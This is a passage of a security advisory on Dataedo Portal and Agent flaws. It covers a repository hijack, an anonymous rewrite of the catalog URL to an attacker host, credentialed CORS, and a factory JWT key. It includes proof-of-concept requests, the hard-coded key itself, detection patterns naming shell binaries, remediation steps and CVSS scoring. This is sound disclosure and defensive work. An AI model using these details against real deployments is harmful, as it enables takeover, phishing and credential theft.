POST /api/auth/login {"login":"<attacker-sql-login>","password":"<PASSWORD>","loginMethod":0,"userAgent":"poc-agent"}
  -> HTTP 200, Set-Cookie: Dataedo.Cookie=CfDJ8...; HttpOnly; Secure
GET /api/users            -> HTTP 200 [{"login":"<attacker-sql-login>","id":1,"displayName":"...","createdBy":"sa"}]
GET /api/repository/info  -> HTTP 200 {"repositoryName":"<repository-db>","connectionName":"<attacker-sql-host>",...}
```

The permissions row created by the all-roles assignment carried a timestamp 65 milliseconds after the login, which an independent reviewer verified as corroborating the assignment path rather than assuming it. Alternative takeover paths in the same state — reading `login_access_codes` directly, or rewriting `sso_configurations` to inject an identity provider — were identified statically and not expanded.

A healthy, already-configured instance is not exposed to the switch: HTTP 409 and an explicit error. The exposure is window-shaped, and the tool published with this advisory reports a closed window honestly rather than pretending otherwise.

*Item B — permanent anonymous tamper and SSRF, no window required (CWE-306, CWE-918, CWE-200, CWE-209).* `POST /api/repository/connect-and-upgrade` catches `RepositoryAlreadyConfiguredException` and continues into the upgrade path, so against a running instance it returns HTTP 202 and `SavePortalUrl` rewrites `configuration[WEB_CATALOG_URL]` in the live repository. Verified: the value became `http://attacker.example/`. That value is the base URL for SAML assertion-consumer redirects, for e-mailed links and for the front end, so a silent anonymous rewrite converts the product into a credential-phishing surface for its own users, persistently. The same endpoint can trigger a repository schema upgrade, which on a version-lagged instance is a destructive primitive. Alongside it: the outbound-SQL discovery route (TDS pre-login observed, 94 bytes, type `0x12`), the SSRF route with its internal-service, self-Kestrel and cloud-metadata reach, `/api/repository/database-update-log` returning HTTP 500 with a full stack trace, `/api/repository/identity` leaking the service account on Windows, `/api/repository/host-environment` fingerprinting the deployment shape, the static `lastOperation` field acting as an anonymous error oracle, both OpenAPI documents served without an environment gate, and the anonymous registration endpoint without rate limiting.

*Item C — permissive CORS with credentials (CWE-942, CWE-346).* In `StartupBase.AddCors`:

```
builder.SetIsOriginAllowed(_ => true)
       .AllowAnyHeader()
       .AllowCredentials()
       .WithMethods(GET, POST, PUT, PATCH, DELETE)
```

combined with a session cookie configured `SameSite=None` and `SecurePolicy=Always`. Every origin is reflected and credentials are allowed, so any website can issue credentialed cross-origin requests against the cookie-authenticated `/api/*` surface and read the responses. For a logged-in administrator visiting a hostile page, that is bulk exfiltration of catalog metadata, credential configuration and user lists, plus cross-site state-changing operations across GET, POST, PUT, PATCH and DELETE. This is an independent root cause: it needs no repository hijack, no window and no vulnerability in another endpoint, and it applies to a healthy production instance. Status: established by reversing the shipped configuration code; a browser-driven cross-site demonstration was not performed, and this advisory says so rather than presenting it as dynamically verified.

*Item D — factory JWT signing key with issuer and audience validation disabled (CWE-798, CWE-347).* The shipped `JwtAuthentication` configuration carries `TokensKey` = `0C8845EB-A973-4F74-B404-47C4789914A6`, used as ASCII bytes for HMAC-SHA256 at `Dataedo.Authentication:873` (signing) and `Dataedo.Authentication:902` (validation), also read at `Dataedo.Api:23005` and `:23020`. `ValidIssuer` and `ValidAudience` are shipped GUIDs but `ValidateIssuer = false` and `ValidateAudience = false` at `Dataedo.Authentication:903`-`906`, and `RequireHttpsMetadata = false`. Signature validity is therefore the only protection. Scope is narrower than it first appears, and the narrowing is a correction made during this work: `ForwardDefaultSelector` confines the JWT scheme to `/public/v1`, so `/api/*` uses cookie or PAT authentication and is unaffected. Within `/public/v1` a second gate applies — `CustomJwtBearerEvents.TokenValidated` requires `configuration[API_STATUS] == "ENABLED"` and the raw token to equal `configuration[API_TOKEN]` exactly. Demonstrated in the default-key shape, against a repository whose `configuration` rows we controlled: `GET /public/v1/custom-fields` returned HTTP 401 anonymously and HTTP 200 with a forged HS256 token carrying the claim name `API_CLIENT` and a ten-year expiry, returning real catalog data; the accompanying 500-stage stack trace placed `TokenValidated`'s database comparison after signature validation, which is the proof that the static key produced an accepted signature. Boundary, stated plainly: the Windows installer writes a fresh GUID for this value during its API-configuration step (the installer module contains the UTF-16 flow strings for that step and a `NewGuid` member reference), so this item applies to container deployments, manual or copy-based deployments, and upgrades that preserve an older configuration file. Whether a specific marketplace template overrides it was not established, and no default-survival claim is made for installer-based deployments. As an amplifier it matters mainly in combination with item A, where the attacker writes the `API_STATUS` and `API_TOKEN` rows themselves; the public API surface includes an operation that enqueues one of the built-in job types, which is data-plane injection and resource abuse rather than arbitrary-type execution.

### Reachability and impact — detection notes

Detection is uncomfortable for a defender, and that is worth stating precisely.

The Portal-side step produces one authorized, successful, ordinary-looking GET. There is no anomaly in the Portal access log, no failed request, and no error path. An account with the repository-management role reading the repository connection string is the feature working.

The decisive event is a database write, on a different host, in a schema that the Portal itself writes to as part of normal operation. Generic database auditing on `[Scheduler].Job` inserts will therefore fire for legitimate activity too. The discriminating signals are specific:

- An `InvocationData` value whose `Type` names anything outside the vendor's scheduler job namespace, and especially `System.Diagnostics.Process`.
- A `State.Result` of "Can not serialize the return value", which is what a live object returned from a non-vendor method produces.
- `PerformanceDuration` in the low single-digit milliseconds for a row whose type is not a scheduler task — the vendor's own job types do meaningful work.
- An `Arguments` column containing `cmd.exe`, `powershell`, or any shell binary.
- A `JobQueue` row inserted with a `FetchedAt` that is never populated because no worker is attached, which indicates a write into a repository nobody is consuming — the signature of a preparation step rather than of an execution.
- On the Agent host: an unexpected child process of the Agent service, a written marker or payload file, and outbound connections from the Agent to hosts that are not catalogued data sources.
- For the adjacent group: `POST` traffic to `/api/repository/create-on-existing-database`, `/api/repository/set` or `/api/repository/connect-and-upgrade` from unauthenticated clients; a change in `configuration[WEB_CATALOG_URL]`; a change in `appsettings.json` on a Portal host; and any `Access-Control-Allow-Origin` reflection with `Access-Control-Allow-Credentials: true`.

## 11. Fix Recommendations

### Fix Recommendations — vendor-side, ordered by root cause

1. **Constrain the invocation type at execution time (the sink).** Register a custom Hangfire `ITypeResolver` on both Agent servers that resolves only types from the vendor's own scheduler job namespace and implements its own task-executor interface, and add a server-side filter — an `IServerFilter` and an `IElectStateFilter` — that transitions any job whose declaring type is not on that allowlist into a failed state before execution. `GlobalJobFilters.Clear()` should be followed by installing a restrictive set, not an empty one. Validate the shape of `InvocationData` explicitly (`Type`, `Method`, `ParameterTypes`, `Arguments`) and reject the `System.*` namespace outright, with `System.Diagnostics.Process` as a named test case.
2. **Stop returning the connection string.** If the administrative workflow genuinely needs to display it, return the host and catalog only, mask the login, and never transmit the password. There is no version of "return the credential encrypted with a key the client already has" that protects the credential.
3. **Replace the static key with per-installation key material.** DPAPI on Windows, a managed key service elsewhere, or an installer-generated random key stored outside the assembly. Make `GenerateEncryptionKey()` an actual code path; refuse to start when the factory key is still in use; rotate on upgrade. Move to authenticated encryption (AES-GCM) and drop the fixed IV — a fixed key with a fixed IV in CBC mode is deterministic, so equal plaintexts produce equal ciphertexts and leak equality even where confidentiality nominally holds. Until rotation exists, treat every ciphertext ever written by any deployment as recoverable.
4. **Separate the scheduler identity from the catalog identity.** The credential used to read catalog metadata should not be able to write `[Scheduler]` rows, and the credential the Agent uses should be scoped to the scheduler schema and read-only elsewhere. Better still, make job dispatch non-reflective: store a job type identifier from a closed enumeration and resolve it through a factory, so storage content selects a behaviour rather than naming a type.
5. **Run the Agent service under least privilege** and document the identity explicitly in the installer, rather than relying on the empty `ServiceConfiguration` default. An Agent host that can be turned into SYSTEM by a database write is a privilege-escalation surface regardless of the scheduler fix.
6. **Close the anonymous repository surface.** Put the 18 ungated routes behind authentication plus a short-lived, single-use setup token issued by the installer for the wizard window. Narrow the middleware allowlist so that it applies only while the repository is genuinely unconfigured, and make the state machine single-directional so that a configured repository cannot be re-registered over HTTP at all. Add a global fallback authorization policy so that a forgotten attribute fails closed rather than open.
7. **Fix `connect-and-upgrade` specifically.** It must not catch `RepositoryAlreadyConfiguredException` and continue into a path that rewrites `WEB_CATALOG_URL` and triggers a schema upgrade. Those are two different operations with two different authorization requirements and neither belongs on an anonymous route.
8. **Pin CORS.** Replace `SetIsOriginAllowed(_ => true)` with a configured origin allowlist derived from the deployment's own portal URL; retain `AllowCredentials` only for those origins; set the session cookie to `SameSite=Lax` unless a cross-site embedding requirement genuinely exists.
9. **Retire the factory JWT key.** Refuse to start with the shipped GUID; enable `ValidateIssuer`, `ValidateAudience` and `RequireHttpsMetadata`; keep the `ForwardDefaultSelector` scoping, which is the one control here that already works as intended.
10. **Production information hygiene.** Gate both OpenAPI documents behind an environment check or authentication, suppress stack traces in error responses, remove the anonymous exception-detail routes, and rate-limit the anonymous registration endpoint.
11. **Ship a regression test for the sink.** Insert a `[Scheduler].Job` row whose `InvocationData.Type` is `System.Diagnostics.Process` into a test repository, attach a test Agent, and assert that the job fails, that no child process is created, and that the failure state names the allowlist. Also assert that an unauthenticated `POST` to every repository-management route returns 401 in every state the product can be in except the token-bearing wizard window.

### Fix Recommendations — operator-side, until a patch exists

1. Restrict network access to the repository database listener so that only Portal and Agent hosts can reach it. Treat any principal able to write `[Scheduler]` as holding command execution on every attached Agent host.
2. Run the Agent service under a dedicated least-privilege domain account rather than the default, and place Agent hosts in a restricted segment with egress limited to catalogued data sources.
3. Enable database auditing on `[Scheduler].Job` and `[Scheduler].JobQueue` inserts, and alert on `InvocationData` values naming types outside the vendor's scheduler namespace, on `System.Diagnostics.Process` by name, on `State.Result` equal to "Can not serialize the return value", and on shell binaries in `Arguments`.
4. Complete first-run repository configuration immediately after installation, and never expose a freshly installed, unconfigured Portal to an untrusted network. The registration window is genuinely anonymous.
5. Monitor `appsettings.json` on Portal hosts and `configuration[WEB_CATALOG_URL]` in the repository for unexpected change; both are anonymous-write targets in the shapes described above.
6. Rotate the repository database credential and treat every prior copy as exposed, since any repository-management principal can recover it on demand. Do not reuse it on other systems.
7. Inventory installer-produced `Dataedo-Web-backup-*.zip` artifacts. They contain ciphertext that the static key decrypts offline; store them as credential material or destroy them.
8. Pin CORS at the reverse proxy in front of the Portal: strip reflected `Access-Control-Allow-Origin` values, refuse credentialed cross-origin requests to `/api/*`, and reject any response carrying `Access-Control-Allow-Credentials: true` for an origin that is not your own.
9. If the deployment did not go through the installer's API-configuration step — container, manual or preserved-configuration upgrade — assume the factory JWT key is live, rotate it, and keep `API_STATUS` disabled unless the public API is required.
10. Treat the Agent host as a crown-jewel system for the duration of this exposure: it holds, in decryptable form, the credentials for every data source in the catalog.

## 12. CWE and CVSS

### CWE and CVSS — classification

**Primary: CWE-502 — Deserialization of Untrusted Data.** The Agent deserializes a stored job document and resolves the type it names, then invokes the named method with the deserialized arguments. The data crosses a trust boundary (repository database to Agent process) without validation of the type identity. CWE-470 (Use of Externally-Controlled Input to Select Classes or Code, unsafe reflection) is an equally defensible characterization of the same mechanism; CWE-502 is chosen as primary because the unsafe selection happens through a deserialization path.

**Contributing, within the counted chain:**

- **CWE-321 — Use of Hard-coded Cryptographic Key.** The AES-256 key and IV are byte-array literals in a shipped assembly.
- **CWE-522 — Insufficiently Protected Credentials.** A sysadmin-level database credential is transported to a client in a form that provides no real protection.
- **CWE-863 / CWE-284 — Incorrect Authorization / Improper Access Control.** A repository-management role grants recovery of credentials belonging to a different component, with no separation between catalog administration and database ownership.
- **CWE-250 / CWE-732 — Execution with Unnecessary Privileges / Incorrect Permission Assignment.** The execution lands on a host running with machine-level authority, with no least-privilege account and no constrained job executor.

**Adjacent disclosure group, carried separately and not contributing to the score:** CWE-306 (missing authentication for a critical function), CWE-918 (server-side request forgery), CWE-200 and CWE-209 (information and error-message exposure), CWE-942 and CWE-346 (permissive cross-domain policy and origin validation error), CWE-798 (hard-coded credentials) and CWE-347 (improper verification of cryptographic signature).

### CWE and CVSS — vector derivation

Published vector, computed from first principles with CVSS 3.1 weights:

```
CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H

ISS            = 1 - ((1 - 0.56) * (1 - 0.56) * (1 - 0.56))
               = 1 - (0.44 ^ 3)
               = 1 - 0.085184
               = 0.914816

Impact (S:C)   = 7.52 * (ISS - 0.029) - 3.25 * ((ISS * 0.9731) - 0.02) ^ 13
               = 7.52 * 0.885816 - 3.25 * (0.890207 - 0.02) ^ 13
               = 6.661336 - 3.25 * (0.870207 ^ 13)
               = 6.661336 - 3.25 * 0.164116
               = 6.661336 - 0.533378
               = 6.127958

Exploitability = 8.22 * AV(0.85) * AC(0.44) * PR(0.50, Scope Changed) * UI(0.85)
               = 8.22 * 0.85 * 0.44 * 0.50 * 0.85
               = 1.306569

Base (S:C)     = min(1.08 * (Impact + Exploitability), 10)
               = 1.08 * (6.127958 + 1.306569)
               = 1.08 * 7.434527
               = 8.029289

Roundup        = ceil(8.029289 * 10) / 10 = 8.1
```

Published base score: **8.1 (High)**.

Per-metric reasoning:

- **AV:N** — the entry route is a network HTTP API and the write path is a network database listener. Neither requires local or physical access.
- **AC:H** — two conditions outside the attacker's control must hold for the outcome to occur: a Dataedo Agent must be attached to the same repository database (the Agent is a separately installed component, and without one the injected row is never fetched), and the attacker must have a network path to that database. Both were true in the verified shape and neither is a property the product guarantees. This is the metric that carries the honest weight of the deployment preconditions.
- **PR:H** — only a principal holding role action 11 or above was demonstrated to reach the disclosure. The zero-permission contrast was refused a session outright. PR:L is not supported by any evidence in this package, and publishing PR:L on the strength of an administrator-only demonstration is exactly the kind of inflation this section exists to avoid.
- **UI:N** — no victim interaction participates. No page visit, no click, no file open, no administrator action on the Agent host.
- **S:C** — see the Scope subsection immediately below.
- **C:H** — the Agent host is fully readable at the achieved identity, and the recovered repository credential exposes the entire catalog plus every stored downstream data-source secret in offline-decryptable form.
- **I:H** — arbitrary command execution means arbitrary modification on the Agent host, and the same credential permits arbitrary modification of the catalog's governance data.
- **A:H** — arbitrary command execution permits termination of the Agent and its services; the same write primitive permits destruction of scheduler state, halting imports, quality runs and exports.

The conditional reading, published separately and explicitly not the headline:

```
CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H

Impact         = 6.127958   (unchanged; ISS depends only on C, I, A)
Exploitability = 8.22 * 0.85 * 0.77 * 0.50 * 0.85 = 2.286496
Base (S:C)     = 1.08 * (6.127958 + 2.286496) = 1.08 * 8.414454 = 9.087611
Roundup        = ceil(9.087611 * 10) / 10 = 9.1
```

That reading applies only to a deployment where a Dataedo Agent is known to be attached to the repository and the repository listener is reachable from the attacker's network position — the ordinary topology of an installation that uses the product's scheduling features at all, but a topology we did not prove is universal, so it stays conditional.

### CWE and CVSS — the Scope decision

Scope is Changed, and the reasoning is component-and-host based rather than rhetorical.

The vulnerable component is the Dataedo Portal web application: its authorization model is what fails to protect the repository connection string, and its cryptographic design is what makes the protection worthless. The Portal's own authority boundary ends at its process, its application-pool or service identity, and the set of resources its role model governs. Nothing in the Portal's authorization model extends to a second machine.

The impacted component is the Dataedo Agent host — a different installable component, running as a different process under a different identity, on a different machine, reachable from the Portal only through the repository database. When an exploited weakness in the Portal's authorization and cryptography yields arbitrary operating-system command execution on that other machine, resources beyond the vulnerable component's security scope are affected, which is the definition of a Scope change in CVSS 3.1.

Two supporting observations make the boundary concrete rather than merely administrative. First, the crossing is mediated by a third component — the repository database — whose credentials are themselves the object of the confidentiality failure; the attacker does not authenticate to the Agent at all, and the Agent has no inbound trust relationship with the Portal beyond "we read the same tables". Second, the identity gained is not the Portal's identity in any shape: the Portal runs in an application pool or container with a web-tier identity, while the outcome is a machine-level identity on a Windows host.

What Scope is **not** resting on: it is not justified by the anonymity of the adjacent group (which is scored nowhere in this vector), not by the CORS or JWT items, and not by downstream data-source compromise, which is a consequence of the Agent-host identity rather than an independent scope change. The rejected Scope-Unchanged reading is printed below precisely so that the difference is auditable:

```
CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H

ISS            = 0.914816
Impact (S:U)   = 6.42 * 0.914816 = 5.873095
Exploitability = 8.22 * 0.85 * 0.44 * 0.27 * 0.85 = 0.705547
                 (PR weight 0.27 under Scope Unchanged)
Base (S:U)     = min(5.873095 + 0.705547, 10) = 6.578642
Roundup        = 6.6
```

That 6.6 reading treats the whole outcome as staying inside the Portal's authority scope. It is rejected because the execution demonstrably happens on another host under another component's service identity, and because scoring it as Unchanged would understate a cross-machine privilege boundary that the verified evidence shows being crossed.

### CWE and CVSS — what is deliberately not published

- **No score for the adjacent group.** Items A through D in section 10 are described, evidenced and bounded, and none carries a CVSS vector here. Folding an unauthenticated repository-registration primitive or a credentialed-CORS primitive into a vector whose entry point is `PR:H` would inflate the published number by borrowing reachability this chain does not have. They are reported for remediation on their own merits, with their own status and their own proof levels.
- **No PR:L and no PR:N.** The least privileged principal demonstrated is role action 11. The composition scenario in which an anonymous party ends up holding an all-roles session (bridge 1, window-state hijack) is documented as an amplifier and is not used to lower the `PR` metric, because that composition requires the victim to install a component during a window and is therefore a different chain with different preconditions.
- **No claim of SYSTEM across all deployments.** The score's impact metrics are justified by arbitrary command execution at the Agent process identity, not by a specific token. Where the service is configured with a lower-privileged account, impact on that host is correspondingly lower, and that is the operator's decision to make, not ours to assume.
- **No version-range claim beyond what was tested.** 26.2.8 for both components is what was executed. The newer Portal build is reported as a corroborating observation with its own evidence and its own gap (the Agent was not re-run against it).
- **No severity inflation from the credential's privilege level.** That the recovered login happened to be `sa` in the tested deployments makes the chain trivially complete; a scoped login with write access to `[Scheduler]` would still yield execution. The score does not depend on `sa`, and no metric was raised on account of it.

### CWE and CVSS — summary

| Item | Value |
|---|---|
| Primary CWE | CWE-502 |
| Contributing CWE | CWE-321, CWE-522, CWE-863 / CWE-284, CWE-250 / CWE-732 |
| Alternative characterization | CWE-470 |
| Published vector | `CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H` |
| Published base score | 8.1 High (computed 8.029289, rounded up) |
| Conditional reading | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` = 9.1 High, for Agent-attached deployments with a reachable repository listener — labelled conditional, not the headline |
| Rejected reading | `CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H` = 6.6 Medium, rejected because execution occurs on a different component and host |
| Adjacent group score | none published; the four items are described with evidence and status and excluded from the vector |
| Score correction | earlier analysis notes carried a vector built on an anonymous-reachability premise; that premise was refuted (section 10) and the vector was withdrawn with it. Every figure published here was computed from the vector printed beside it, and no inherited figure was carried over |

*Maintained by 0day Rubbish Research Team — disclosure@0day-rubbish.com*
